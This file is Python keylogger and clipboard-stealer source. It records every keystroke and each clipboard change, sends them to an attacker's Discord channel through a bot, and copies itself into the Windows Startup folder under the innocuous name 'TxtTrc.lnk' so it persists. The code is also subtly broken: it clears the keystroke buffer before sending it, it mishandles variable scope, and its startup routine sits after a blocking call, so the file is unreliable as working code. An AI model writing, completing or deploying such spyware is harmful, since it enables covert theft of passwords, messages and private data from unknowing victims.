import discord
import pyperclip
import time
import keyboard
import os
import shutil
import sys

string =""

# Replace 'your_token_here' with your actual bot token
TOKEN = 'your_token_here'
CHANNEL_ID = your_channel_id  # Replace with your channel ID

intents = discord.Intents.default()
intents.messages = True
bot = discord.Client(intents=intents)

last_content = None

@bot.event
async def on_ready():
    channel = bot.get_channel(CHANNEL_ID)

    while True:
        # Check for clipboard changes
        clipboard_content = pyperclip.paste()
        
        if clipboard_content != last_content:
            await channel.send(f"Clipboard content:\n{clipboard_content}")
            last_content = clipboard_content
            
        # Check for any key press
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            string += event.name
            if len(string) >= 10: #This sends keystrokes in group of 10 (can be adjusted)
                string = ""
                await channel.send(string)  # Send the specific key that was pressed
        
        time.sleep(0.05)  # Adjust the interval as needed

bot.run(TOKEN)

def add_to_startup():
    # Get the path to the current script
    script_path = os.path.abspath(sys.argv[0])
    
    # Get the user's startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    # Define the name of the new shortcut
    shortcut_name = 'TxtTrc.lnk'
    shortcut_path = os.path.join(startup_folder, shortcut_name)
    
    # Check if the script is already in the startup folder
    if not os.path.exists(shortcut_path):
        # Create a shortcut to the script
        shutil.copy(script_path, shortcut_path)
        
add_to_startup()
